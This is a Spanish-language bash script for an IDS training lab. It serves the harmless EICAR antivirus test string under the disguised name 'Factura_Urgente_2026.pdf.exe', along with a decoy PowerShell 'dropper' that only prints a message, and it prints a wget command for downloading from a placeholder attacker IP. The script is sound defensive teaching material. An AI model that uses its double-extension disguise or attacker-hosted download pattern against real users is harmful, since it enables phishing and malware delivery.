#!/bin/bash
# =============================================================
# 01_servidor_malicioso.sh
# Simula un servidor de Internet que "aloja malware".
# -------------------------------------------------------------
# Usa el archivo EICAR — estándar de la industria para probar
# IDS/AV sin ningún riesgo. NO es malware real.
# Ver: https://www.eicar.org/download-anti-malware-testfile/
#
# Ejecutar en la VM ATACANTE (o en la misma Kali, terminal 1)
# =============================================================

CYAN='\033[0;36m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BOLD='\033[1m'; NC='\033[0m'

SRV_DIR="$HOME/lab_ransom_ids/servidor_c2"
PORT=8080
FAKE_NAME="Factura_Urgente_2026.pdf.exe"

mkdir -p "$SRV_DIR"

# Archivo de prueba EICAR (cadena oficial, 100 % inofensiva)
# Esta es la cadena exacta definida en eicar.org
printf 'X5O!P%%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
  > "$SRV_DIR/$FAKE_NAME"

# También servimos un script de "dropper" falso para la regla Snort
cat > "$SRV_DIR/dropper.ps1" <<'PS'
# ARCHIVO SEÑUELO - LABORATORIO IDS
# Simula un script PowerShell malicioso para activar reglas Snort.
# No hace nada real.
Write-Host "Simulacion de dropper - LAB EDUCATIVO"
PS

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════╗"
echo "║    🦠  Servidor Malicioso de Práctica  🦠    ║"
echo "╚══════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}Archivos disponibles:${NC}"
echo -e "  • /${FAKE_NAME}  (EICAR test file)"
echo -e "  • /dropper.ps1             (script señuelo)"
echo
echo -e "${BOLD}IP de esta máquina:${NC}"
ip -4 -brief addr show | grep -v "^lo" | awk '{printf "  %s  →  %s\n", $1, $3}'
echo
echo -e "${BOLD}Desde la VM VÍCTIMA, descarga con:${NC}"
echo -e "  ${GREEN}wget http://<IP_ATACANTE>:${PORT}/${FAKE_NAME}${NC}"
echo
echo -e "${YELLOW}[*] Ctrl+C para detener el servidor${NC}"
echo "─────────────────────────────────────────────────"

cd "$SRV_DIR"
python3 -m http.server "$PORT"
